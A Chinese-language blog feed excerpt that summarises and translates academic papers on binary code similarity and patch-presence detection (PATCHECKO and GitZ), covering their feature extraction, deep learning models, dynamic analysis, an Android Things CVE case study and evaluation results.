<p>特征提取器接收的输入是目标函数的反编译代码。我们默认 IDA Pro （一个用于提取二进制程序特征的商用反编译器）识别出的函数边界是可用且正确的。因此，我们将特征提取器作为 IDA Pro 的一个插件。我们开发出了插件的两个版本：一个带GUI，另一个使用命令行（用于自动化）。因为PATCHECKO的目标是跨平台的二进制文件，所以插件可以支持对不同架构（x86、amd64和arm 32/64 bit）进行特征提取。<br>
我们基于Keras和TensorFlow实现了神经网络的建模、训练和分类，使用TensorBoard来实现整个训练过程的可视化。</p>
<h2 id="B-动态分析引擎">B.动态分析引擎</h2>
<p>正如在** 设计** 一节中描述的，动态分析的关键挑战是给分析引擎准备输入和在目标函数执行时跟踪动态信息。<br>
<strong>输入准备。</strong> 正如在第Ⅲ节-B部分提到的，PATCHECKO需要高效地准备执行环境。为了不必装载整个二进制文件就能进行动态分析，我们使用了DLL注入来执行一个只表示单一目标函数的压缩的可执行文件。我们使用了动态加载函数（如dlopen()）来加载动态链接文件，它返回了一个被加载对象的句柄，这个句柄随后被dlopen API中的其他函数使用，例如可以把返回值传给dlsym，通过函数名找到函数的地址，进而能够运行目标函数。<br>
当然，库函数文件包含了大量函数，其中一些是非导出函数（non-exported functions），为了后续的分析，PATCHECKO使用LIEF将这些函数导出。这样PATCHECKO就能够通过 dlopen() 和 dlsym() 找到库函数地址，执行并跟踪所有候选函数，而不需要运行整个程序。这个方法的可靠性极好且效率极高，我们因此可以关注于目标函数而不需处理整个程序。同时，我们使用了LibFuzzer对候选函数进行模糊测试，生成了不同的输入集。对于执行环境，我们人工地为不同的全局变量选择了具体的初始值。<br>
<strong>检测框架。</strong> 因为目标是异构的移动/物联网生态系统，因此我们选择将PATCHECKO的动态检测工作放在 IDA Pro 和 GDB 上。我们还为安卓和Android Things平台写了一个GDB和GDBServer的插件，为IOS平台写了一个IDA Pro和debugserver的插件。</p>
<h2 id="C-案例分析">C.案例分析</h2>
<p>为了能更好理解这一方法的细节，我们提供了一个例子来展示如何在Android Things固件上定位一个已知的CVE漏洞以及如何确定某个漏洞是否被修复。Android Things是谷歌一个专为嵌入式IoT设备设计的操作系统。<br>
<strong>挖掘已知CVE漏洞函数。</strong> 我们选用了一个Android Security Bulletins上的漏洞：CVE-2018-9412，一个位于libstagefright库removeUnsynchronization函数中的DoS漏洞。为了方便进行案例分析，我们直接使用Clang从含有漏洞的和修复过的libstagefright库源码中编译出二进制文件，优化级别设置为O0。图6展示了该漏洞触发点的源代码和汇编代码，我们将在接下来的小节中对这个图的几个部分进行进一步描述。<br>
<strong>生成训练数据集。</strong> 我们使用Clang从安卓函数库里编译了100个库的代码，目标架构包括x86、amd64、ARM 32-bit和ARM-64bit，优化级别涵盖O0、O1、O2、O3、Oz和Ofast，最终获得了2108个二进制库文件。更多相关细节将在第Ⅴ节呈现。<br>
<strong>特征提取。</strong> 我们写了一个基于IDA Pro的特征提取插件来提取特征，在获得特征后，PATCHECKO会根据它来生成特征向量。PATCHECKO从libstagefright.so的所有函数特征里识别出了5646个函数，并将其全部转换为函数特征向量。<br>
<strong>通过深度学习进行漏洞检测。</strong> 将特征提取出来后，我们使用训练的模型进行检测，以漏洞函数和已修复函数作为基准。该模型基于漏洞函数的特征向量识别出了252个候选函数，基于已修复函数识别出了971个候选函数。我们也比较了漏洞函数和已修复函数的特征向量以检查它们是否相似，结果表明两个特征向量并不相似，例如图6中可以看出两者具有明显不同，修复过程移除了memmove函数，并对数值进行了检查和判断。同样的，也可以在汇编层面上观察到基本块数量的差异。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211012230244.png" alt="20211012230244"></p>
<p><strong>动态分析引擎。</strong> 候选漏洞函数和已修复函数不仅在数量上较多，而且候选函数之间的相似度也较高，导致难以通过人工定位目标漏洞函数。对此我们使用了动态分析引擎来生成每个函数的动态信息。我们首先使用LibFuzzer生成函数removeUnsynchronization()的不同输入数据，并测试证明它们都能正常运行于漏洞函数和已修复漏洞的函数。和之前一样，我们使用这些数据来测试每个候选函数，筛去执行过程中崩溃的函数。通过这步验证，我们获得了38个候选漏洞函数和327个候选已修复函数。对于这些候选函数，PATCHECKO的动态分析引擎将生成动态信息。对于在Android Things上的插桩，我们使用gdbserver获取Android Things设备上的动态特征。表Ⅲ展示了部分漏洞函数的动态特征向量的分析。在下一小节，我们分析了为什么<em>candidate_29</em>是漏洞函数</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211029225224.png" alt="20211029225224"></p>
<p><strong>计算函数相似度。</strong> 我们使用三个之前提到过的指标来计算函数间的相似度。在表Ⅳ中列出了相似度前十的漏洞函数，表Ⅴ列出了相似度前十的已修复函数。对于表Ⅳ，其中我们看到candidate_29函数排在第一位。根据相似度距离算法，如果距离较小，则对应的相似度就较高。可以看到这个函数和排在它后一位的candidate_27存在较大差距。我们因此得到结论，candidate_29就是漏洞函数。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211029225207.png" alt="20211029225207"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030053720.png" alt="20211030053720"></p>
<p>进一步观察表Ⅲ的结果，我们可以看出为什么动态特征之间的距离非常小。表中两行高亮的数据分别是candidate_29和基准漏洞函数。在表Ⅱ中，我们已知F_13表示同一分支指令的最大频率，F_14代表同一算术指令的最大频率。注意到candidate_29是唯一一个和基准漏洞函数具有相同频率的候选函数。值得一提的是这个分析只在动态分析的时候进行，静态分析的时候无法收集到这些特征。</p>
<p>对于检测已修复函数，表Ⅴ由于篇幅限制仅展示了排名结果前十的候选函数。在本测试结果中，candidate_102排在第一位，不过它对应了错误的函数。然而注意到排在第二的candidate_29，它的Sim值比第三名要小得多。直观的说，我们可以将范围缩小到这两个候选函数，并且可以猜测candidate_29可能是候选漏洞函数。然而目前我们还不能确定这个函数是否是已修复函数。</p>
<p><strong>差分分析引擎。</strong> 基于前面的步骤，我们可以确定candidate_29即是目标函数，但仍旧不知道它是否被修复了。我们收集了静态特征（例如j__aeabi_memmove），动态语义相似性得分（34.7 对 65.6）和差分特征（differential signatures）（j__aeabi_memmove里的if条件）。差分分析引擎随后根据这些指标分析出目标函数是否被已被修复。</p>
<h1>Ⅴ.评估</h1>
<p>在这一节，我们将从搜索的准确度和计算效率来评估PATCHECKO。我们还评估了深度学习模型、动态分析引擎和差分分析引擎的准确度。</p>
<h2 id="A-数据集准备">A.数据集准备</h2>
<p>在评估中，我们收集了三个数据集：1）数据集Ⅰ主要用于训练深度学习模型以及评估模型准确性；2）数据集Ⅱ用于收集已知CVE漏洞，用于构建漏洞函数数据库；3）数据集Ⅲ用于评估深度学习模型、动态分析引擎和差分分析引擎在分析真实移动/物联网固件时的准确性和性能。</p>
<p><strong>数据集Ⅰ：</strong> 这个数据集用于进行神经网络训练和基线比较（baseline comparison）。它包含了从源代码编译来的二进制代码，为我们提供了基准数据（ground truth）。我们假设从相同源码中生成的两个函数是相似的，不同源码中生成的函数是不相似的。我们使用Clang从Android-8.1.0_r36的源码中编译了100个库函数，每个库根据不同的目标平台（ x86, AMD64, ARM 32bit， ARM 64bit ISA）、优化级别（O0, O1, O2,O3, Oz, Ofast）生成了23个不同的二进制文件。不过，并不是每个库函数都可以用六种优化级别进行编译（如libbrillo, libbacktrace,libtextclassifier, libmediaplayerservice）。我们总共获得了2108个库文件，包含了2037772个函数特征样本，其中每个二进制文件都是debug版本，方便我们基于符号名建立基准数据。在后续测试时，我们生成的是受限的Release版本。</p>
<p><strong>数据集Ⅱ：</strong> 我们的目标是进行评估漏洞，因此我们生成了包含漏洞函数和已修复漏洞函数的数据库，其中包含了函数的动态特征向量和静态特征向量。漏洞函数数据集来自Android Security Bulletins，包括了从2016年7月到2018年11月的漏洞。这个数据库涵盖2076个漏洞，其中有1351个高危漏洞和381个关键漏洞。</p>
<p><strong>数据集Ⅲ：</strong> 为了评估PATCHECKO，我们收集了不同的固件映像，包括多个版本的Android、Android Things 和 IOS。其中，我们选择了Android Things 1.0 和 Google Pixel 2 XL (Android 8.0) 的两个固件映像作为目标。对于漏洞检测，我们考虑了2018年中修复的 Android 8.0和8.1 上的漏洞，最终从我们的数据库中选择了25个CVE漏洞用来对我们的方案进行评估。</p>
<h2 id="B-训练模型">B.训练模型</h2>
<p>我们的深度学习模型使用了6层的序列模型，使用数据集Ⅰ进行训练。我们首先为每一层指定输入。第一层接受的是输入张量的形状（input shape）的信息。在我们的实验中，它的值是96。我们将数据集Ⅰ的所有函数分解为3个不相交子集，分别用于训练（1222663个）、校验（407554个）和测试（407555个）</p>
<h2 id="C-测试设备">C.测试设备</h2>
<p>我们对PATCHECKO的评估在两种设备上进行，一种是Android Things， 另一种是Google Pixel 2 XL。对于Android Things， 我们使用了Android Things 1.0 ，它包含了2018年5月及以前的安全补丁；对于Google Pixel 2 XL，它装载了 Android 8.0 的系统，补丁版本是2017年7月。</p>
<h2 id="D-准确性">D.准确性</h2>
<p>在这一节，我们评估了PATCHECKO的深度学习模型、动态分析引擎和补丁检测的准确性。</p>
<p><strong>深度学习模型。</strong> 图8展示了在训练了大约15小时后，深度学习模型的准确率和损失，其中准确率可达到96%。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090924.png" alt="20211030090924"></p>
<p>根据 H. Zhang 和 Z. Qian 在 USENIX Security 18 发表的 “Precise and accurate patch presence test for binaries”，当没有符号表时，需要应用相似性检测方案来对目标函数进行定位，但如果漏洞函数和已修复函数不相似，则目标函数可能会出现遗漏。为了避免这个问题，我们使用我们的深度学习模型来验证这25个CVE漏洞对应函数的脆弱版本和已修复版本之间的相似性。结果发现该深度学习模型对漏洞函数和已修复函数之间的检测结果可能并不相似。例如，如果CVE-2018-9345被修复了，H. Zhang 和 Z. Qian 的解决方案可能会因为基于检测漏洞函数的某些功能特征而错过目标函数，导致在检测漏洞是否被修复时，检测了错误的函数。<br>
我们使用该模型对Android Things 和 Google Pixel 2XL 中的25个CVE漏洞进行检测，检测结果的平均准确率高于93%。图7展示了当我们测试两个设备固件映像的脆弱和已修复函数时的误报率。有趣的是对于CVE-2017-13209和CVE-2018-9412的误报率有明显不同。此外，我们注意到在已修复版本中，由于漏洞CVE-2017-13209已经被修复，其误报率比未修复版本低上一些。类似的，对于漏洞CVE-2018-9412的未修复版本，其误报率也比已修复版本高。然而，在表Ⅵ中，对于待检测Android Things 固件映像上含有的CVE-2017-13209漏洞，并没有在结果中被报告出来。因此，当PATCHECKO判断漏洞函数时，深度学习模型可能会遗漏正确的目标函数。但在直觉上，“根据已知漏洞检测漏洞函数可能会遗漏一个打过补丁的函数”的确是有道理的。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030074438.png" alt="20211030074438"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090830.png" alt="20211030090830"></p>
<p><strong>动态分析引擎。</strong> 动态分析引擎的目标是对候选函数进行删减。在表Ⅵ和表Ⅶ中，动态分析引擎的结果仅包含了<strong>Execution</strong> 和<strong>Ranking</strong> 两个指标。由于我们希望减少动态特征分析时候选函数的数量，因此对这些函数使用了具体的输入值来验证候选函数。只要候选函数能够通过输入的测试，PATCHECKO就会对它们进行动态特征分析。例如，在深度学习后，漏洞CVE-2018-9412拥有252个候选函数，在动态分析阶段，PATCHECKO使用了多种不同的值对这些函数进行测试，最后留下了38个函数进行动态特征分析。最后，PATCHECKO计算了函数的相似性得分。表Ⅵ和表Ⅶ表明在PATCHECKO的结果中，每一次都能将目标函数排在前三位，除了对于CVE-2017-13209，它在深度学习阶段就把目标函数排除了。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030082128.png" alt="20211030082128"></p>
<p><strong>补丁检测。</strong> 根据差分特征、静态语义特征和表Ⅵ、表Ⅶ的结果，PATCHECKO生成了最终结果表Ⅷ。其中只遗漏了CVE-2018-9470，原因是漏洞函数和修复函数仅差了一个整数。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090706.png" alt="20211030090706"></p>
<p><strong>局限。</strong> 如果漏洞函数和已修复函数之间的差异非常微小，我们的相似性检测可能无法捕捉到它们之间的差异，例如实验中的CVE-2018-9470。这个遗漏是因为两个函数的静态特征和动态特征没有表现出差异。一个解决方法是加入已知漏洞利用中更细粒度的特征。然而即使这个假设是可行的，也还需要在方案通用性上进行进行权衡。</p>
<h2 id="E-执行耗时">E.执行耗时</h2>
<p>表Ⅵ和表Ⅶ分别列出了对漏洞函数和已修复函数执行深度学习检测和动态分析所用的时间。深度学习检测阶段平均花费3秒，而进行动态分析所需要的时间则取决于候选函数和执行环境的数量。例如，由于在候选函数数量上存在较大差异（72个），导致CVE-2017-13208花费的时间要比CVE-2017-13182少很多。在动态分析时，PATCHECKO会引导候选函数对应的执行环境，这些环境是并发运行的。目前PATCHECKO并行了所有执行环境，未来的工作将侧重于并行执行每个环境中的每个候选函数，以进一步减少动态分析所需的时间。</p>
<h1>Ⅵ.相关工作</h1>
<p>我们简单的概括一下相关的工作。我们专注于使用代码相似性的方法来检测已知漏洞，而不需要访问源代码，因此这一节不会讨论挖掘未知漏洞和基于源码进行检测的方法。我们将相关的工作分为基于编程语言的方案和基于机器学习的方案。</p>
<p><strong>基于编程语言的方案。</strong> 之前的研究者在“如何检测两段语法不同的代码在语义上是否相同”这一问题上已经做了不少研究。有很多传统的方法都是基于对函数的CFG进行匹配。Bindiff基于代码句法对节点进行匹配。Bindiff先恢复两个二进制文件的CFG，然后使用启发式算法来规范和匹配图中的顶点。在“Leveraging semantic signatures for bug search in binary programs”中，每个CFG的顶点都用一个表达式树进行表示，顶点之间的相似性通过使用对应表达式树之间的编辑距离来计算。关注于跨平台二进制代码相似性检测的方法“discovre: Efficient cross-architecture identification of bugs in binary code”在CFG上应用了基于图的匹配算法。其思想是把二进制代码转换为中间表示，通过使用随机的输入来执行代码并进行采样来生成每个CFG顶点的语义。在理论方面，“Scalable graph-based bug search for firmware images” 和“Neural network-based graph embedding for cross-platform binary code similarity detection”从CFG中提取特征表示，并将它们进行图嵌入，以加快匹配过程。最近的研究“Rendezvous: A search engine for binary code”和“Expose: Discovering potential binary code reuse”也使用了类似的静态分析技术。<br>
动态二进制代码分析是另一个检测函数相似性的方法。Binhunt使用符号执行和定理证明(theorem proving)来区分动态的二进制函数，以测试基本块的语义差异。然而这个方法仅关注了基本块，但两个函数有可能在功能上一致，可是由于编译器优化的原因生成了不同的基本块。Egele等人提出了一种动态等价测试基元，通过覆盖预期的程序逻辑来实现完全覆盖(“Blanket execution:Dynamic similarity testing for program binaries and components”)，它收集了函数在受控的随机环境下执行过程中产生的副作用，如果两个函数的副作用相似，那么它们就有可能是相似的。然而这是一个较为耗时的方法，需要以不同输入对每个函数进行多次执行。</p>
<p><strong>基于机器学习的方案。</strong> 基于深度学习的图嵌入方法也被用于进行二进制相似性检查。目前最前沿的“Neural network-based graph embedding for cross-platform binary code similarity detection”在目标二进制文件中的所有函数集合中寻找相同的受影响的函数；“αdiff:cross-version binary code similarity detection with dnn”利用机器代码来计算其神经网络模型的最佳参数；“Asm2vec: Boosting static representation robustness for binary clone search against code obfuscation and compiler optimization”和“Neural machine translation inspired binary code similarity comparison beyond function pairs”都使用了NLP来替代人工进行特征选择。然而，当规模增大后，会导致候选函数增加。PATCHECKO可以结合动态分析对候选函数进行删减并减少误报。<br>
Zhang等人提出了一个新颖的角度(“Precise and accurate patch presence test for binaries”)，利用源码级别的信息来检测目标二进制文件中某个函数是否被修复了。然而它需要源代码以及上面提到的相似性检测方案来定位目标函数。PATCHECKO使用深度学习和动态二进制分析来定位目标函数，并进行准确的补丁检测。</p>
<h1>Ⅶ.结论</h1>
<p>我们提出了漏洞评估框架PATCHECKO，它使用深度学习和混合了静态、动态二进制分析来进行跨平台二进制代码相似性分析，在无法获得源代码的情况下以高精度识别已知漏洞，此外，它可以使用差分引擎来区分漏洞函数和补丁函数。我们针对多种优化级别和目标架构编译了 Google Pixel XL2 和 Android Things 固件映像中的25种CVE漏洞函数，并用它们对PATCHECKO进行评估。结果表明我们的深度学习模型识别漏洞的准确率超过93%。<br>
我们还展示了如何在受控环境下对漏洞函数进行动态分析，以减少误报。在所有测试结果中，PATCHEKO都能将正确的结果输出在排名的前三名之中。此外，它的差分引擎以96%的准确率区分了漏洞函数和已修复函数。</p>
]]></content>
  </entry>
  <entry>
    <title>Fr3v1带你读论文-Similarity of Binaries through re-Optimization</title>
    <url>/4066.html</url>
    <content><![CDATA[<p>在知乎上看到白泽的师傅们读论文的记录，试着把读的论文做了个类似的总结。之后看论文也会选用这种方法，翻译实在太笨比了</p>
<p>这篇是课题组导师给的论文，跟课题相关度极大</p>
<p>数学公式渲染并不是很好</p>
<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU0Nzkz">Fr3v1带你读论文-Similarity of Binaries through re-Optimization - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<span id="more"></span>
<h1>引言</h1>
<p>在对不含符号表等信息的二进制代码检测相似性时的主要难点是建立相似性，例如有时候代码是通过不同编译器、不同优化级别或者针对不同架构编译的。在尽量减少误报的情况下解决这个难题无论是对逆向工程还是定位漏洞代码都至关重要。<br>
作者提出了一个可用于大规模检测且具有较高准确度的技术。其工作原理是将二进制代码过程分解为上下文无关的可比较片段，并将其统一为规范的形式，随后通过简单的比较来找到等价的片段。<br>
结果表明该方案（称为GitZ）能够有效地执行大规模比较，且相似性比较的精度较高，误报率较少。</p>
<h1>目前的技术缺陷</h1>
<ol>
<li>在受限（stripped）二进制文件、跨编译器、跨架构和跨优化选项的场景下效果不好</li>
<li>误报率高</li>
<li>无法应对百万级的大规模比较</li>
<li>在静态分析时需要动态分析进行配合</li>
</ol>
<h1>提出的方法</h1>
<ol>
<li>分割程序片段。将程序分解为strand，即基本块的数据流片段，作为相似性比较的基本单元<strong>strand:A strand is the list of all of the instructions from the basic block that affect the computation of a specific value.</strong></li>
<li>通过重新优化找到等价的代码片段。通过在strands上重新进行编译优化器的优化过程，将代码片段引入新的规范化形式，从而在后续能够<strong>识别语法上不同但语义等价的strands</strong>。</li>
<li>建立代码相似性。爬取部分语料库生成一个统计框架，来评估每一个strand在整个程序中的重要程度。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210924140852.png" alt="20210924140852"></p>
<h1>设计与实现</h1>
<h2 id="二进制代码规范化和一般化处理">二进制代码规范化和一般化处理</h2>
<h3 id="将二进制代码提升为中间代码">将二进制代码提升为中间代码</h3>
<p>这个步骤排除了编译器和链接器的干扰，使得后续工作可以关注于语义方面。该步骤有很多框架可以使用，作者在这里使用了angr的pyvex库将Intel的x86_64和ARM的AArch64指令（包括浮点指令）提升为VEX-IR作为原型。<br>
值得一提的是这一步进行的不只是简单的反编译，而是使用变量表示相应机器的状态（包括内存、寄存器，包括标志寄存器），并用对这些变量的操作来表示指令的语义，因此在这个过程中并不关心任何优化，只需要专注于准确表示语义信息。</p>
<h4 id="指令提升的过程对相似性的影响">指令提升的过程对相似性的影响</h4>
<p>会产生一些冗余和总体上的偏差。例如在图3中将aarch64的&quot;mov x1,x21&quot;转换为VEX-IR时产生了冗余的临时变量t14、t15、t16；将x86_64的&quot;add rax,1&quot;转换为BAP后，生成了临时变量T2。<br>
如在图1中体现的，存在这种冗余的变量在进行相似性学习时是致命的，也会对后续在跨架构和优化级别的比较中造成严重干扰<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210927141152.png" alt="20210927141152"></p>
<h3 id="从提升后的IR得到LLVM-IR-strands">从提升后的IR得到LLVM-IR strands</h3>
<p>为了达到“Lifter无关”，作者使用了一个（自己写的）工具把VEX-IR转换为LLVM-IR。选择LLVM-IR的原因是它的稳定性、辅助扩展工具多且对多架构支持较好。（个人猜测主要是方便对代码进行统一优化）</p>
<h4 id="提取strands">提取strands</h4>
<p>在这个阶段的目标是建立一个过程表达（procedure representation）以便在后续配合找到相似的程序片段<br>
提取strand的步骤：生成CFG，分离出每个基本块，其中strand就是在一个基本块中和某个值计算相关的所有指令</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210928224354.png" alt="20210928224354"><br>
以上是提取strands过程的伪代码，大概是“倒序取一条指令，判断其操作的变量与当前strand中记录的变量交集是否为空，如果不为空则将指令记录到该strand中”。其中Ref和Def函数返回一个指令所引用或定义的变量集合。这个算法在一个基本块上重复执行，直到把整个基本块完全覆盖。</p>
<h3 id="将-LLVM-IR-的strands规范化">将 LLVM-IR 的strands规范化</h3>
<p>这个部分要解决的三个主要问题是：1.编译器造成的strand的语义差异，例如编译优化、运行时库和控制流的影响 2.不同机构造成的影响，例如通用寄存器数量、指令集表达差异等 3.提升器的造成的影响（如前面提到的冗余指令）</p>
<p>解决方案是利用编译器重新进行优化，变相进行统一规范。LLVM-IR对应的优化工具是CLang opt。作者将每个strand作为一个LLVM-IR函数片段，并对代码做了两步更改：1.将寄存器更改为全局变量 2.添加返回strand值的指令。用’-early-cse’和’-instcombine’选项进行了“公共子表达式消除”和“合并冗余指令”。图1(ii)-(iii)中描述的就是这个过程</p>
<p><em>在用编译器进行规范化处理时，strand默认被输出为储存着表达式的有向非循环图（DAG），为了方便后续比较，作者将其输出为线性表达的文本格式。</em></p>
<h3 id="转换为一般化表示">转换为一般化表示</h3>
<p>重命名strands中所有符号，即将寄存器和临时变量按顺序重新命名。这步对跨架构的比较十分关键，因为在给定的计算中使用的寄存器与实际语义无关，并且在不同架构中完全不同。</p>
<h2 id="进行大规模代码相似性搜索">进行大规模代码相似性搜索</h2>
<h3 id="使用strands的MD5值检测相似性">使用strands的MD5值检测相似性</h3>
<p>在比较时使用代码片段的md5值进行比较，这个方能够法减少内存使用且加快了比较过程。对于过程<em>P</em>，将它的表示*R§*定义为过程中所有strands哈希值的集合，即:<br>
<strong>R§={MD5(Canonicalize&amp;Normalize(sp))|sp∈P}</strong></p>
<h3 id="分离出需要的strands">分离出需要的strands</h3>
<p>在对已知序列和目标函数q，t进行比较时，有一个可行的思路是比较两个过程的哈希集的交集，表示为M(q,t)=R(q)∩R(t)，但在实际中这个方法效果并不好，一个原因是一些匹配的strands可能只是编译器针对特定架构等因素添加的语义无关代码（artifacts），例如栈空间访问或编译优化，与实际代码语义并没有关系。（题外话，这些代码可以用于识别生成程序时使用的工具链。）</p>
<p>为了避免这个问题，需要区别出从源代码中直接产生的、与程序语义相关的strands。一个简单的方法是将出现次数较多的strand赋予较低的权重。定义Pr(s)为strand s 出现的概率，其中概率空间限制为①从二进制文件中提升的代码，②规范化和一般化后的strands，记为W和 $\widetilde{W}$ 。<br>
如在1式中定义的，我们定义strand s 的重要性为Pr $\widetilde{W}$ (s)并将其出现在不同程序中的次数除以 $\widetilde{W}$ 里所有函数中出现的strand种类数。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211005012155.png" alt="20211005012155"><br>
因此已知序列和目标函数的相似性度量即为<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20211002183201.png" alt="20211002183201"></p>
<h3 id="用随机抽样来估算strand的频率">用随机抽样来估算strand的频率</h3>
<p>由于计算Pr $\widetilde{W}$ (s)需要 $\widetilde{W}$ ，但 $\widetilde{W}$ 是一个动态增长的值，因此无法简单地计算出Pr $\widetilde{W}$ (s)。作者采用了另一个方案，随机采样获得一个较大的子集P作为全局上下文，来估计Pr $\widetilde{W}$ (s)：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20211002191720.png" alt="20211002191720">（将4式代换到3式将得到2式）</p>
<p>其中P是通过爬取 $\widetilde{W}$ 获得的函数集，因此覆盖了所有支持的编译器、优化级别和架构。同时P作为子集具有较小的尺寸，在后续方法中也能减少内存使用。<br>
注意到此时的Pr $\widetilde{W}$ 其实是一个近似值，因此设P中未收集的strand的f(s)=1，在避免f(s)/|P|产生不确定的同时也做了假设——这些strands在 $\widetilde{W}$ 中极少出现。</p>
<h1>实验与结果</h1>
<h2 id="生成样本">生成样本</h2>
<p>在学习样本上，作者用了多个版本的CLang、gcc和icc从一些开源代码（包括OpenSSL、git、bash, Wireshark, QEMU等）中编译了大约50万个优化级别不同、针对x86_64和AArch64的二进制文件（对应关系如下图），其中有意选择了一些包含漏洞的软件版本。作者从中爬取了一千个函数，用来生成全局上下文P。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211003205831.png" alt="20211003205831"></p>
<p><em>对于全局上下文的合适大小进行实验时，作者发现大约在400个函数后就对误报率基本不造成影响，因此使用了1K个函数（2.5倍）</em></p>
<h2 id="评价指标">评价指标</h2>
<p>使用CROC（Concentrated ROC）来测量随着阈值的提高而遇到的误报率</p>
<h2 id="评估结果">评估结果</h2>
<ol>
<li>与另一个工具Esh相比，作者的工具支持跨架构和优化级别，且具有更高的准确率，在效率上更是明显优于Esh</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211005002153.png" alt="20211005002153"></p>
<ol start="2">
<li>挑战最大的是学习单一架构的代码相似性后跨架构对代码进行检测。因为实现操作和指令的范式不同，可能导致错误匹配strands。同时，由编译器和架构导致的内存布局和寻址等方式的不同，也会影响匹配准确率。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211004223519.png" alt="20211004223519"></p>
<h2 id="缺陷">缺陷</h2>
<p>作者方法的前提是假定了相同源代码编译出的二进制代码会产生语义相同的strands，并且可以进行提取和一系列转化，但这个假设其实不是完全成立的。</p>
<ul>
<li>编译器不同时，控制流图可能存在差异，导致基本块表达存在不同（如下图）。这个问题会使得匹配度偏低。</li>
</ul>
<p>造成这个的原因是作者为了提高效率和大规模检测，把strands的范围限制在了一个基本块中。可以通过扩大执行链的范围来缓解这个问题（当然代价是开销上的增加）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211004214237.png" alt="20211004214237"></p>
]]></content>
  </entry>
  <entry>
    <title>Fr3v1带你读论文-Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities</title>
    <url>/41992.html</url>
    <content><![CDATA[<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYwNDcx">Fr3v1带你读论文-Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL2Fic3RyYWN0L2RvY3VtZW50LzkxNTMzOTk=">Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities<i class="fa fa-external-link-alt"></i></span>(<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU5MjQ2">针对移动和物联网设备已知漏洞的混合固件分析<i class="fa fa-external-link-alt"></i></span>)的太长不看版</p>
<span id="more"></span>
<h1>主要内容</h1>
<p>移动设备和物联网设备的操作系统以及它们随后的升级文件通常是以二进制文件的形式发布。由于这些二进制文件通常是闭源的，用户或第三方企业若是想测试软件的安全性只能依靠逆向工程，此外，如何验证二进制文件中最近的补丁是否有效也是一个悬而未决的问题。常规的软件补丁修复是提升移动设备和物联网设备安全性的重要保障，这就需要开发人员、集成商和供应商的共同支持，及时把补丁分发到受影响的所有设备上。但实际上，供应商们对移动和物联网产品遵循着不同，甚至是错误的安全更新议程。其次，以往的研究反映出存在着“潜在的补丁缺口(a hidden patch gap)”：有些供应商错误的声称他们已经修复了漏洞。因此，在二进制文件中检测漏洞是否被修复对于软件安全至关重要。以往对二进制文件中的漏洞检测大多基于静态的代码相似性分析，然而它无法捕捉程序的动态行为，因此可能产生大量误报且难以区分漏洞是否已经修复。<br>
在论文中，作者提出了一个针对可执行文件漏洞和补丁存在性检测的框架PATCHECKO。它混合了静态检测和动态检测方法，能够对X86和arm架构的二进制代码进行漏洞检测。作者的测试结果表明这个框架对漏洞检测和漏洞函数区分具有较高的准确率。</p>
<h1>设计与实现</h1>
<p>PATCHECKO的工作需要以下三个步骤：</p>
<ol>
<li>训练漏洞检测器</li>
<li>用漏洞检测器对固件进行静态分析</li>
<li>对2分析得出的可能含有漏洞的函数进行动态分析，验证漏洞是否存在并识别函数中的漏洞是否被修复</li>
</ol>
<p>工作过程如图：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210903221707.png" alt="workflow"></p>
<h2 id="0x1-漏洞静态检测器和静态分析">0x1  漏洞静态检测器和静态分析</h2>
<p>对于已知漏洞挖掘，深度学习方法的准确性和效率都明显优于过去的二分图匹配和动态相似性测试。PATCHECKO的漏洞检测器使用Keras和TensorFlow实现了神经网络的建模、训练和分类，使用TensorBoard来实现整个训练过程的可视化。</p>
<h3 id="Ⅰ-构建数据集">Ⅰ 构建数据集</h3>
<p>使用反汇编器（如IDA）的插件提取程序控制流图（CFG），并生成每个函数以及其基本块级的特征向量，每个特征向量包括48个特征，如下图：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210908213440.png" alt="feature-vector"></p>
<h3 id="Ⅱ-深度学习">Ⅱ 深度学习</h3>
<p>作者在采用了一个线性层堆叠的序贯模型。<br>
